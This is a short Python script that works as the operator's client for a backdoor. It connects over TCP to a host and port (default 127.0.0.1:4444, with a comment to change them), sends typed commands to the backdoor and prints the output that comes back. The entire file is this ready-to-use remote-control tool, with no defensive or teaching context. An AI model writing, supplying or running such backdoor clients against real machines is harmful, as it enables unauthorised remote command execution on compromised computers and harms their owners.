import socket

def connect_to_backdoor(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    print(f"[*] Connected to {host}:{port}")

    while True:
        command = input("Enter command: ")
        client.send(command.encode())

        if command.lower() == 'exit':
            break

        output = client.recv(4096).decode()
        print(output)

    client.close()

if __name__ == "__main__":
    connect_to_backdoor('127.0.0.1', 4444)  # Change the host and port to match your server